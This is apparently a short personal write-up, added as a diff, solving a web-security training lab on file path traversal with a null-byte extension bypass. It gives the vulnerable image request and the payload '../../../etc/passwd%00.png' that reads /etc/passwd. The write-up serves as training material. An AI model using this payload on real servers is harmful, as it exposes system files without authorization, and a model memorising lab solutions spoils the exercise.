@@ -1,0 +1,16 @@
+Lab: File path traversal, validation of file extension with null byte bypass
+
+
+This lab contains a file path traversal vulnerability in the display of product images.
+
+The application validates that the supplied filename ends with the expected file extension.
+
+To solve the lab, retrieve the contents of the /etc/passwd file.
+
+
+
+Query vulnerabilità: GET /image?filename=38.png
+
+Exloit: ../../../etc/passwd%00.png
+
+Risultato: GET /image?filename=../../../etc/passwd%00.png
